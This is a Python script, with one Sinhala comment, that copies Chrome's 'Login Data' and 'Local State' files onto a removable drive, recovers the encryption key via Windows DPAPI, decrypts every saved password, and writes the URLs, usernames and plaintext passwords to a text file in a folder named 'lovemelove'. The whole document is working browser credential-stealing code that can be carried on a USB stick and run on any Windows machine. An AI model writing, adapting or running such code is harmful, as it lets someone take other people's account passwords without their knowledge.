import os
import json
import base64
import sqlite3
import shutil
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import win32crypt
import time

# පරණ පරිගණකයේ Chrome ගොනු මාර්ගය
LOGIN_DATA_SRC = r"C:\Users\USER\AppData\Local\Google\Chrome\User Data\Default\Login Data"
LOCAL_STATE_SRC = r"C:\Users\USER\AppData\Local\Google\Chrome\User Data\Local State"

def find_pen_drive():
    drives = os.popen('wmic logicaldisk get caption').readlines()
    for drive in drives:
        drive = drive.strip()
        if drive and drive != "Caption":
            return drive
    return None

def copy_files_to_pendrive():
    pen_drive = find_pen_drive()
    if not pen_drive:
        print("Pen drive not found.")
        return None

    dest_folder = os.path.join(pen_drive, "lovemelove")
    os.makedirs(dest_folder, exist_ok=True)

    try:
        login_data_dst = os.path.join(dest_folder, "Login Data")
        local_state_dst = os.path.join(dest_folder, "Local State")
        shutil.copy(LOGIN_DATA_SRC, login_data_dst)
        shutil.copy(LOCAL_STATE_SRC, local_state_dst)
        print("Files copied successfully to:", dest_folder)
        return login_data_dst, local_state_dst, dest_folder
    except Exception as e:
        print(f"Copy error: {e}")
        return None

def get_master_key(local_state_path):
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        return decryptor.update(payload)[:-16].decode()
    except:
        try:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
        except:
            return "Could not decrypt"

def extract_passwords(login_data_path, local_state_path, output_folder):
    key = get_master_key(local_state_path)
    db = sqlite3.connect(login_data_path)
    cursor = db.cursor()

    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        with open(os.path.join(output_folder, "passwords.txt"), "w", encoding="utf-8") as f:
            for url, username, encrypted_password in cursor.fetchall():
                password = decrypt_password(encrypted_password, key)
                f.write(f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n")
        print("Passwords written to passwords.txt")
    except Exception as e:
        print(f"Extraction error: {e}")
    finally:
        cursor.close()
        db.close()

def main():
    result = copy_files_to_pendrive()
    if result:
        login_data_path, local_state_path, output_folder = result
        time.sleep(1)
        extract_passwords(login_data_path, local_state_path, output_folder)

if __name__ == "__main__":
    main()
